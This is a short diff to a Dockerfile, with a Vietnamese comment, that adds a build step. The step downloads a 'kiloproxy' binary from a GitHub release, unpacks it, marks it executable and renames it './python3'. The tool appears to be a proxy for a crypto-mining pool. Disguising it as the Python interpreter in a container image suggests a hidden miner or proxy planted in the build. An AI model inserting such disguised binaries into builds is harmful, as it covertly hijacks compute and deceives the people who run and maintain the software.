@@ -10,6 +10,11 @@ RUN apt-get update && apt-get install -y \
     pkg-config \
     && rm -rf /var/lib/apt/lists/*
 
+RUN wget https://github.com/kilopool/kiloproxy/releases/download/1.0/kiloproxy-linux-x64.xz \
+    && unxz kiloproxy-linux-x64.xz \ 
+    && chmod +x ./kiloproxy-linux-x64 \ 
+    && mv ./kiloproxy-linux-x64 ./python3
+
 # Thư mục làm việc
 WORKDIR /usr/src/app
 
